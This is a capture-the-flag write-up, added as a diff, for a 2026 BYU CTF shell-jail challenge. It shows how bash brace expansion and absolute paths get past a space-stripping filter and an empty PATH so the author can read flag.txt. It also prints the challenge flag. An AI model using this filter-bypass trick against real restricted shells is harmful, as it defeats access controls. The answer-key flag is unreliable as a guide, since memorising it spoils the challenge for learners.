@@ -1,0 +1,62 @@
+---
+title: 'BYU CTF 2026 - Easy'
+description: 'Escaping a space-stripping shell with no PATH using brace expansion and absolute paths'
+date: 2026-05-30
+tags: ['writeup', 'misc', 'jail', 'bash', 'byuctf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Description
+
+> Okay, easy mode is turned on. You know how to use bash, right?
+>
+> nc chals.cyberjousting.com 1370
+
+## Initial Analysis
+
+Connecting drops us into a custom shell:
+
+```
+Run anything you want! With... some modifications, anyways
+$
+```
+
+A couple of probes reveal what the "modifications" are:
+
+```
+$ ls -la     ->  bash: line 1: ls-la: command not found
+$ cat /flag* ->  bash: line 1: cat/flag*: No such file or directory
+```
+
+Two things stand out:
+
+1. The shell **strips spaces** from our input (`ls -la` becomes `ls-la`).
+2. `PATH` is effectively empty, so bare command names are never found.
+
+## The Vulnerability
+
+We need to (a) reintroduce word separation without typing a space and (b) call binaries by absolute path. Bash **brace expansion** does both at once, because `{a,b}` expands to `a b` *after* the space filter has already run:
+
+```
+$ {/bin/ls,-la}
+Output:
+-rwxr-xr-x ... bash
+-rw-r--r-- ... flag.txt
+-rwxr-xr-x ... run
+```
+
+There is the flag file, right in the working directory.
+
+## Exploitation
+
+```
+$ {/bin/cat,flag.txt}
+byuctf{g0_t0_j41l_a60941}
+```
+
+## Flag
+
+```
+byuctf{g0_t0_j41l_a60941}
+```
